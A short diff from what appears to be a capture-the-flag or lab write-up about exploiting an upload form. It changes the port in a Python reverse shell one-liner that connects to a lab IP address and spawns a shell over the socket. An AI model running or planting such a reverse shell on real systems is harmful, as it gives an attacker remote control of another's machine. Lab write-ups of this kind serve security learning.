@@ -94,6 +94,6 @@ Lets handle the issue at hand right now..The Upload form, lets try uploading a m
 Payload:
 
 ```python
-import os,pty,socket;s=socket.socket();s.connect(("10.10.14.109",1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
+import os,pty,socket;s=socket.socket();s.connect(("10.10.14.109",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
 ```
 
